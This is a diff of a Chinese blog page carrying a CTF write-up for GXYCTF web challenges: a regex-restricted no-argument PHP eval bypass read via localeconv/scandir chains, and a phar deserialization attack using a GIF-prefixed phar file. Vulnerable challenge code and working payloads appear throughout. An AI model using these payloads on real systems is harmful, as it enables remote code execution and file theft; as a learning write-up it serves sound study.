@@ -470,34 +470,148 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p><a href="https://www.gem-love.com/websecurity/530.html" target="_blank" rel="noopener">https://www.gem-love.com/websecurity/530.html</a><br>前面的师傅里面提到了sky师傅的博文，所以我也参考了下。</p>
 <p>那么首先，出现无参RCE的必要条件是什么呢？大抵是如下的正则：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&#39;;&#39; &#x3D;&#x3D;&#x3D; preg_replace(&#39;&#x2F;[^\W]+\((?R)?\)&#x2F;&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;    </span><br><span class="line">    eval($_GET[&#39;code&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里?R是引用当前表达式的意思，那么配上前面的成分，我们被允许的参数值必须具有以下形式：<br>a(b(c())<br>a()<br>而不是a(‘342’)之类的。</p>
+<pre><code>if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) {    
+    eval($_GET[&#39;code&#39;]);
+}</code></pre><p>这里?R是引用当前表达式的意思，那么配上前面的成分，我们被允许的参数值必须具有以下形式：<br>a(b(c())<br>a()<br>而不是a(‘342’)之类的。</p>
 <p>那么回到题目上来，首先网页并没有太多信息，那么我们常规几板斧拿出来：1.抓包，有没有有用的信息？2.网页源码，有没有提示？3.源码泄露，git,svn等等试一遍4.扫目录，看有没有有趣的目录可以发掘5.实在不行看看题目的名字，网页的框架，有没有提示你可能存在的漏洞  。我个人认为正常的题目这样做肯定可以继续发展下去而不至于一筹莫展。<br>当然，此处是很常见的.git源码泄露，我们把githack拿下来的index.php看一看：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+include &quot;flag.php&quot;;
+echo &quot;flag在哪里呢？&lt;br&gt;&quot;;
+if(isset($_GET[&#39;exp&#39;])){
+    if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) {
+        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) {
+            if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) {
+                // echo $_GET[&#39;exp&#39;];
+                @eval($_GET[&#39;exp&#39;]);
+            }
+            else{
+                die(&quot;还差一点哦！&quot;);
+            }
+        }
+        else{
+            die(&quot;再好好想想！&quot;);
+        }
+    }
+    else{
+        die(&quot;还想读flag，臭弟弟！&quot;);
+    }
+}
+// highlight_file(__FILE__);
+?&gt;
+</code></pre>
 <p>到这就可以确认是无参RCE了，那么现在来小结下如何应对无参RCE以及如何过这里的正则：<br>首先明确一点，基于无参RCE的格式要求，我们可利用的有很多，其中主要包括全局变量以及返回值有特殊性的函数。甚至可以像sky那样，通过getallheaders()拿到环境变量，使自己传参的参数变为可控的，进而执行命令。<br>那么回到题目上，现在肯定第一步是看看目录了，从sky那学到的常规手法，是getcwd()获得当前目录，scandir(getcwd())获得当前目录的文件。而如果要往上层目录看的话，就利用dirname()，使用scandir(dirname(getcwd()))。不过这里我试了下好像不太行，所以改用其他方法：<br>我们知道，scandir()读当前目录的用法是scandir(‘.’),但这里的’.’要怎么获得呢？那就要涉及到一个高级用法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">current(localeconv())</span><br></pre></td></tr></table></figure>
-<p>本地试一下结果：<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="localeconv"><br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="current(localeconv)"><br>后者之返回一个点，是完全可以利用了。<br>扫目录</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<pre><code>current(localeconv())</code></pre><p>本地试一下结果：<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/1.jpg" class="lazyload" data-srcset="1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="localeconv"><br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="current(localeconv)"><br>后者之返回一个点，是完全可以利用了。<br>扫目录</p>
+<pre><code class="php">print_r(scandir(current(localeconv())));</code></pre>
 <p><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/3.jpg" class="lazyload" data-srcset="3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="dir"></p>
 <p>那么接下来就要读flag.php了，这里我们当然只能利用flag.php在返回的数组中的键值来操作下。如果flag.php是数组最后一个数值的话，直接end()就解决了。不过这里是倒数第二个，所以有其他方法操作：<br>1.运气法<br>hhh因为是靠随机数，我认为干脆叫运气使然好了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_rand(array_flip(scandir(current(localeconv()))))</span><br></pre></td></tr></table></figure>
+<pre><code class="php">array_rand(array_flip(scandir(current(localeconv()))))</code></pre>
 <p>这里array_rand()不多说，就是随机获得数组中一个下标，而array_flip则可以交换键与值。那么返回的就变成值了。<br>因为这里只有五个文件，我们用随机数完全不用关心其随机性。</p>
 <p>2.使用array_reverse加上next()，把数组逆过来后，flag.php变成第二个元素，恰巧是数组名指针下一个，使用next()即可。</p>
 <p>最后，使用readfile()或highlight_file读文件即可<br>payload:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure>
-
-
+<pre><code class="php">exp=print_r(readfile(array_rand(array_flip(scandir(current(localeconv()))))));</code></pre>
 <h1 id="BabySqli-v3-0"><a href="#BabySqli-v3-0" class="headerlink" title="BabySqli v3.0"></a>BabySqli v3.0</h1><p>phar反序列化的题目。其实从去年10月份到现在自己已经听过无数次phar反序列化的漏洞了，而且学校里师傅们也一直在整相关的pop链什么的，因此寒假一定要解决这个知识点（好像已经欠了不少知识……ssrf从去年8月到现在还没有系统的好好学过……）</p>
 <p>这道题也算是自己的第一道phar反序列化的题目吧，整体不算难。<br>不过比赛时的师傅们可能不这么想，因为这道题的名字容易把人引向sql注入上，但其实登录界面就是个弱口令admin password。估计坑了不少人吧。</p>
 <p>登录进去后，看到一个文件上传(现在的文件上传题很多就是phar的知识点，比如红帽杯)<br><img src="/2020/01/14/GXYCTF--%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83&BabaySqli-v3.0/4.jpg" class="lazyload" data-srcset="4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="上传"></p>
 <p>同时注意到有file参数为upload，可能是个文件包含的点。因此我们尝试一下访问，发现确实存在upload.php.同理，可以确认有flag.php。但显然被ban了。因此再回到file参数上，除了直接的文件包含，当然也可以用伪协议试试，于是成功拿到home.php源码。解码后得：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (′▽`〃)');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"下面是你上传的文件：&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+class Uploader{
+    public $Filename;
+    public $cmd;
+    public $token;
+
+
+    function __construct(){
+        $sandbox = getcwd().&quot;/uploads/&quot;.md5($_SESSION[&#39;user&#39;]).&quot;/&quot;;
+        $ext = &quot;.txt&quot;;
+        @mkdir($sandbox, 0777, true);
+        if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;, $_GET[&#39;name&#39;])){
+            $this-&gt;Filename = $_GET[&#39;name&#39;];
+        }
+        else{
+            $this-&gt;Filename = $sandbox.$_SESSION[&#39;user&#39;].$ext;
+        }
+
+        $this-&gt;cmd = &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;
+        $this-&gt;token = $_SESSION[&#39;user&#39;];
+    }
+
+    function upload($file){
+        global $sandbox;
+        global $ext;
+
+        if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename)){
+            $this-&gt;cmd = &quot;die(&#39;illegal filename!&#39;);&quot;;
+        }
+        else{
+            if($file[&#39;size&#39;] &gt; 1024){
+                $this-&gt;cmd = &quot;die(&#39;you are too big (′▽`〃)&#39;);&quot;;
+            }
+            else{
+                $this-&gt;cmd = &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;
+            }
+        }
+    }
+
+    function __toString(){
+        global $sandbox;
+        global $ext;
+        // return $sandbox.$this-&gt;Filename.$ext;
+        return $this-&gt;Filename;
+    }
+
+    function __destruct(){
+        if($this-&gt;token != $_SESSION[&#39;user&#39;]){
+            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;
+        }
+        eval($this-&gt;cmd);
+    }
+}
+
+if(isset($_FILES[&#39;file&#39;])) {
+    $uploader = new Uploader();
+    $uploader-&gt;upload($_FILES[&quot;file&quot;]);
+    if(@file_get_contents($uploader)){
+        echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;
+        echo file_get_contents($uploader);
+    }
+}
+
+?&gt;</code></pre>
 <p>到这里就有点以前反序列化的意思了，而之所以题目是phar反序列化，就是因为phar的优势就在于可以在伪造文件类型的同时利用phar://来进行反序列化。那我们直接看看要如何利用：<br>首先是找可控参数，我们找到name参数是通过get传的：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br></pre></td></tr></table></figure>
+<pre><code class="php"> $this-&gt;Filename = $_GET[&#39;name&#39;];</code></pre>
 <p>之后在找可以执行命令的点</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">function __destruct(){
+        if($this-&gt;token != $_SESSION[&#39;user&#39;]){
+            $this-&gt;cmd = &quot;die(&#39;check token falied!&#39;);&quot;;
+        }
+        eval($this-&gt;cmd);
+    }</code></pre>
 <p>只要保证token是与user的session相同即可eval执行命令。<br>那么同时我们实例化的对象$uploader在_toString方法中看到，返回值是filename,也是我们可控的name的值。那我们只要让最后的file_get_contents()执行时读我们可控的flag.php就好了。既然如此，先随便传一个文件确定下提示我们的文件位置，确认token,然后本地生成phar文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o=<span class="keyword">new</span> Uploader();</span><br><span class="line">$o-&gt;cmd=<span class="string">'highlight_file("/var/www/html/flag.php)'</span>;</span><br><span class="line">$o-&gt;Filename=<span class="string">'test'</span>;</span><br><span class="line">$o-&gt;token=<span class="string">'GXYbef648df4f254d89810fd44f9a2fc822'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+class Uploader
+{
+    public $Filename;
+    public $cmd;
+    public $token;
+}
+
+$o=new Uploader();
+$o-&gt;cmd=&#39;highlight_file(&quot;/var/www/html/flag.php)&#39;;
+$o-&gt;Filename=&#39;test&#39;;
+$o-&gt;token=&#39;GXYbef648df4f254d89810fd44f9a2fc822&#39;;
+echo serialize($o);
+
+$phar = new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub，增加gif文件头
+$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+$phar-&gt;stopBuffering();
+
+?&gt;
+</code></pre>
 <p>上传phar后，name参数赋值<br><code>phar://+上传phar文件的地址</code><br>再随便上传文件就可以触发phar反序列化，达到命令执行。</p>
 <p>其实因为出题人多打了一个空格，导致正则匹配没效果……直接传一句话或者直接包含flag.php后传文件都可以拿flag……</p>
 <p>GXY的题就先告一段落吧，明天还要做做代码审计的题目，之后要把基础漏洞相关知识都了解透彻，毕竟自己底子不牢。然后把欠着的ssrf,phar等等都系统学一学应该就好了</p>
@@ -707,7 +821,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -719,9 +833,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -854,6 +968,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1067,7 +1183,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1123,6 +1239,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
